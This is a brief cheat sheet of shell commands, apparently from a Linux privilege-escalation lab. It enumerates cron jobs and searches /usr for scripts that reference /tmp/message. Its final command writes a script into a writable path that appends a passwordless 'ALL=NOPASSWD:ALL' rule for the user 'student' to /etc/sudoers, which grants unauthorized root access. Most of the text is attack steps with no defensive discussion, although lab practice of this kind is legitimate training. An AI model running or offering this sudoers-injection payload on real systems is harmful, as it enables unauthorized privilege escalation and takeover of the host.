## Cron Directories
```text
ls -la /etc/cron.d
```
---
## Check All Cron Files
```text
cat /etc/cron.d/*
```
---
## Search for Occurrences of /tmp/message in /usr Directory (Find Scripts/Binaries Using It)
```text
grep -nri "/tmp/message" /usr
```
---
## Create Malicious Script to Add Passwordless Sudo User (Privesc via Writable Path)
```text
printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
```
